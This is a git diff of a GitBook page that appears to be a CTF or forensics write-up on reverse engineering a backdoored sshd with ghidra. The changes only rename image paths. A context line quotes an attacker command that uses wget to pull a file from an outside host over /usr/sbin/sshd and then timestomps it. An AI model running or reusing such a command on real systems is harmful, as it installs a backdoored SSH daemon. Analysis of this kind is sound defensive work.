@@ -104,7 +104,7 @@ We can transfer this back to my machine for some reverse engineering via `ghidra
 
 There are a lot of functions within this function:
 
-<figure><img src="../../../.gitbook/assets/image (15) (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (15) (3) (2).png" alt=""><figcaption></figcaption></figure>
 
 Out of all the functions, `exec_shell` is the most unique because it actually executes something.
 
@@ -229,7 +229,7 @@ wget sharefiles.xyz/image.jpeg -O /usr/sbin/sshd; touch -d `date +%Y-%m-%d -r /u
 
 This was a much larger binary, so let's use `ghidra` to get some pseudocode. When looking through the functions, we can see that the `auth_password` function is a backdoor.
 
-<figure><img src="../../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (16) (7).png" alt=""><figcaption></figcaption></figure>
 
 This might contain the credentials for `root`.&#x20;
 
